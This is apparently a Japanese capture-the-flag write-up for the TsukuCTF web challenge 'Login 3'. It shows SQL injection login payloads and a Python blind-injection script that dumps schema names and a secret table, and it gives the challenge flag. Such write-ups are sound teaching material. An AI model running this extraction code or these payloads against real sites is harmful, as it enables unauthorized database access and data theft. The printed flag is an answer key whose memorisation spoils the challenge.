{"pageProps":{"postData":{"id":"Login3","contentHtml":"# Login 3\n\n> 筑紫くんは、これなら情報が流出するはずがないと自信満々です。果たして...\n>\n> https://tsukuctf.sechack365.com/problems/login3\n>\n> ※ この問題では/problems/login3 以下のみを用います。 他の問題/problems/<name>などと混同しないよう注意してください。\n\nLogin 1 ~ 3 がセットで SQL injection の問題になっています。\nLogin3 では、Blind SQL injection というテクニックが要求されます。\n\nLogin 1, 2 と同様に、Username を `' or 1=1 ; --` としてログインすると、ログインには成功しますが、ユーザー名等は表示されません。したがって、SQL injection に対して脆弱ではあるものの、injection した SQL 文の結果を確認することができません。\nここで、Username を `' or 1=2 ; --`とすると、ログインできませんでしたと表示されます。ということは、`1=1`や`1=2`の部分に bool 値をとる式を与えれば、その結果は取得できるということです。これを積み重ねて DB 内の情報を抜く手法は Blind SQL injection と呼ばれます。\n\ninformation\\_schema からの情報取得等の実行したい query に対して、「query の実行結果の i 文字目は ascii コードで x より大きいか?」という bool 値をとる query を送信し、その bool 値を見ることで、2 分探索で query 結果を取得していきます。流石に手動で入力するのは面倒くさいので、コードを書くことにします。\n\n```python:blind.py\ndef _execAnyQuery_core(query, pos, mid):\n    url = \"https://tsukuctf.sechack365.com/problems/login3/login.php\"\n\n    #queryの pos文字目がasciiコードでmidより大きければtrue\n    params={\n        \"name\":\"' or ascii(substring(({0}),{1},1))>={2} ; -- \".format(query,pos,mid),\n        \"password\":\"a\"\n    }\n    page = requests.post(url, data=params)\n\n    return \"ようこそ\" in page.text\n\ndef _execAnyQuery(query, pos):\n    \"\"\"\n    2分探索でqueryの実行結果のpos文字目を取得する。\n    \"\"\"\n    low = 0\n    high = 256\n    while high-low>1:\n        mid = (high+low)//2\n        if _execAnyQuery_core(query, pos, mid):\n            low = mid\n        else:\n            high = mid\n    return low\n\ndef execAnyQuery(query):\n    i = 1\n    while True:\n        char = int(_execAnyQuery(query, i))\n        if char==0:\n            return\n        print(chr(char), end=\"\")\n        i+=1\n\nexecAnyQuery(\"select version()\")\n# >> 8.0.26\n```\n\nあとは、login2 と同様にテーブルを取得していきます。\n\n```python:blind.py\nfor i in range(100):\n    execAnyQuery(\"select distinct table_name from information_schema.columns limit 1 offset {0}\".format(i))\n    print()\n# urtla_secret_tsukushiというtableがあることがわかる。\n\nfor i in range(10):\n    execAnyQuery(\"select distinct column_name from information_schema.columns where table_name = 'urtla_secret_tsukushi' limit 1 offset {0}\".format(i))\n    print()\n\nfor i in range(33):\n    execAnyQuery(\"select secret from urtla_secret_tsukushi limit 1 offset {0}\".format(i))\n# urtla_secret_tsukushiテーブルがidとsecretのカラムを持つことがわかる。\n\nfor i in range(33):\n    execAnyQuery(\"select secret from urtla_secret_tsukushi limit 1 offset {0}\".format(i))\n#フラグが表示される。\n```\n\nフラグは\n\n```txt\nTsukuCTF{U_Are_Geni0us_T$UKUSH1}\n```\n","title":"Login3","description":"Blind SQL injection","author":"rikuta0811_dash","genre":"Web","solver":9,"point":472}},"__N_SSG":true}